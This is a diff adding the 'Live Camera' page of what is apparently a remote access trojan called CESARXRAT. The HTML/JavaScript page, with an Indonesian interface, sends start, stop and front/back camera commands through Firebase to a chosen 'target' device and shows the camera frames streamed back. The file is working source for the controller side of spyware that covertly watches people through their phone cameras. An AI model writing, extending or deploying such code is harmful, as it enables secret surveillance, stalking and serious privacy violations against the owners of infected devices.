@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Camera - CESARXRAT</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0e27; color: #e0e8ff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+        }
+        .container { max-width: 480px; margin: auto; padding: 20px 16px; }
+        .header {
+            display: flex; align-items: center; gap: 12px;
+            margin-bottom: 18px; padding: 10px 0;
+        }
+        .back-btn {
+            background: rgba(74, 158, 255, 0.1);
+            border: 1px solid rgba(74, 158, 255, 0.3);
+            color: #4a9eff; font-size: 20px;
+            padding: 6px 14px; border-radius: 12px;
+            cursor: pointer;
+        }
+        .header-title {
+            flex: 1; font-size: 22px; font-weight: 800;
+            color: #4a9eff; letter-spacing: 1px;
+        }
+        .status-badge {
+            color: #4ae0a0; font-size: 12px; font-weight: bold;
+            background: rgba(74, 224, 160, 0.15);
+            padding: 5px 12px; border-radius: 50px;
+            border: 1px solid #4ae0a0;
+        }
+        .status-badge.offline {
+            color: #ff6b6b; background: rgba(255, 107, 107, 0.15);
+            border-color: #ff6b6b;
+        }
+        .status-badge.streaming {
+            color: #4a9eff; background: rgba(74, 158, 255, 0.15);
+            border-color: #4a9eff;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; }
+        }
+        .camera-box {
+            background: #000;
+            border-radius: 20px;
+            overflow: hidden;
+            border: 2px solid #2a4a8a;
+            box-shadow: 0 0 30px rgba(74, 158, 255, 0.2);
+            aspect-ratio: 4/3;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        .camera-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            display: block;
+        }
+        .camera-box .placeholder {
+            color: #6a8abf;
+            font-size: 14px;
+            text-align: center;
+            padding: 20px;
+        }
+        .camera-box .placeholder .icon {
+            font-size: 48px;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .controls {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+        .btn {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            text-align: center;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #4a9eff, #1a5bbf);
+            color: #fff;
+            box-shadow: 0 6px 20px rgba(74, 158, 255, 0.3);
+        }
+        .btn-primary:hover { transform: scale(1.02); }
+        .btn-danger {
+            background: linear-gradient(135deg, #ff6b6b, #c0392b);
+            color: #fff;
+            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.3);
+        }
+        .btn-danger:hover { transform: scale(1.02); }
+        .btn-secondary {
+            background: transparent;
+            border: 2px solid #4a9eff;
+            color: #4a9eff;
+        }
+        .btn-secondary:hover {
+            background: #4a9eff;
+            color: #fff;
+        }
+        .btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .switch-camera {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+        .info-box {
+            background: #111a3a;
+            border-radius: 14px;
+            padding: 12px 16px;
+            border: 1px solid #2a4a8a;
+            font-size: 12px;
+            color: #8899dd;
+            margin-top: 12px;
+        }
+        .info-box .label { color: #4a9eff; font-weight: bold; }
+        .fps-counter {
+            text-align: center;
+            font-size: 11px;
+            color: #6a8abf;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <button class="back-btn" onclick="history.back()">←</button>
+            <div class="header-title">Live Camera</div>
+            <span class="status-badge offline" id="statusBadge">OFFLINE</span>
+        </div>
+
+        <div class="camera-box" id="cameraBox">
+            <div class="placeholder">
+                <span class="icon">📷</span>
+                Kamera tidak aktif.<br>
+                Tekan tombol <b>Aktifkan</b> di bawah.
+            </div>
+        </div>
+
+        <div class="controls">
+            <button class="btn btn-primary" id="btnStart" onclick="startStream()">🎥 Aktifkan</button>
+            <button class="btn btn-danger" id="btnStop" onclick="stopStream()" disabled>⏹ Matikan</button>
+        </div>
+
+        <div class="switch-camera">
+            <button class="btn btn-secondary" id="btnBack" onclick="switchCamera('back')" disabled>📷 Belakang</button>
+            <button class="btn btn-secondary" id="btnFront" onclick="switchCamera('front')" disabled>🤳 Depan</button>
+        </div>
+
+        <div class="fps-counter" id="fpsCounter">FPS: 0</div>
+
+        <div class="info-box">
+            <div><span class="label">Status:</span> <span id="statusText">Idle</span></div>
+            <div><span class="label">Kamera:</span> <span id="cameraText">-</span></div>
+            <div><span class="label">Frame terakhir:</span> <span id="lastFrameText">-</span></div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { db, ref, onValue, set } from './firebase-config.js';
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetId = urlParams.get('target');
+
+        if (!targetId) {
+            alert('Target tidak ditemukan!');
+            window.location.href = 'device-target.html';
+        }
+
+        const liveCameraRef = ref(db, 'targets/' + targetId + '/live_camera');
+        const imgEl = document.getElementById('cameraBox');
+        const statusBadge = document.getElementById('statusBadge');
+        const statusText = document.getElementById('statusText');
+        const cameraText = document.getElementById('cameraText');
+        const lastFrameText = document.getElementById('lastFrameText');
+        const fpsCounter = document.getElementById('fpsCounter');
+
+        let frameCount = 0;
+        let lastFpsUpdate = Date.now();
+        let currentStreaming = false;
+
+        // Listen status
+        onValue(ref(db, 'targets/' + targetId + '/live_camera/status'), (snap) => {
+            const status = snap.val() || 'idle';
+            statusText.textContent = status;
+
+            if (status === 'streaming') {
+                statusBadge.className = 'status-badge streaming';
+                statusBadge.textContent = '● LIVE';
+                currentStreaming = true;
+            } else if (status === 'idle') {
+                statusBadge.className = 'status-badge offline';
+                statusBadge.textContent = 'OFFLINE';
+                currentStreaming = false;
+            } else {
+                statusBadge.className = 'status-badge offline';
+                statusBadge.textContent = status.toUpperCase();
+                currentStreaming = false;
+            }
+
+            updateButtons();
+        });
+
+        // Listen camera facing
+        onValue(ref(db, 'targets/' + targetId + '/live_camera/camera'), (snap) => {
+            const cam = snap.val() || '-';
+            cameraText.textContent = cam === 'front' ? 'Depan' : (cam === 'back' ? 'Belakang' : '-');
+        });
+
+        // Listen frame baru
+        onValue(ref(db, 'targets/' + targetId + '/live_camera/current_frame'), (snap) => {
+            const base64 = snap.val();
+            if (!base64 || base64.length < 100) return;
+
+            // Update image
+            imgEl.innerHTML = '<img src="data:image/jpeg;base64,' + base64 + '" alt="Live Camera">';
+
+            // Update FPS
+            frameCount++;
+            const now = Date.now();
+            if (now - lastFpsUpdate >= 1000) {
+                const fps = Math.round(frameCount * 1000 / (now - lastFpsUpdate));
+                fpsCounter.textContent = 'FPS: ' + fps;
+                frameCount = 0;
+                lastFpsUpdate = now;
+            }
+
+            // Update timestamp
+            lastFrameText.textContent = new Date().toLocaleTimeString('id-ID');
+        });
+
+        // Listen timestamp
+        onValue(ref(db, 'targets/' + targetId + '/live_camera/timestamp'), (snap) => {
+            const ts = snap.val();
+            if (ts) {
+                const diff = Date.now() - ts;
+                if (diff > 5000) {
+                    // Frame lama — stream mungkin mati
+                    statusBadge.className = 'status-badge offline';
+                    statusBadge.textContent = 'NO FRAME';
+                }
+            }
+        });
+
+        function updateButtons() {
+            document.getElementById('btnStart').disabled = currentStreaming;
+            document.getElementById('btnStop').disabled = !currentStreaming;
+            document.getElementById('btnBack').disabled = !currentStreaming;
+            document.getElementById('btnFront').disabled = !currentStreaming;
+        }
+
+        window.startStream = function() {
+            set(ref(db, 'targets/' + targetId + '/live_camera/command'), 'START_BACK');
+        };
+
+        window.stopStream = function() {
+            set(ref(db, 'targets/' + targetId + '/live_camera/command'), 'STOP');
+        };
+
+        window.switchCamera = function(facing) {
+            if (facing === 'front') {
+                set(ref(db, 'targets/' + targetId + '/live_camera/command'), 'START_FRONT');
+            } else {
+                set(ref(db, 'targets/' + targetId + '/live_camera/command'), 'START_BACK');
+            }
+        };
+
+        console.log('[CESARXRAT] Live Camera page loaded, target:', targetId);
+    </script>
+</body>
+  </html>
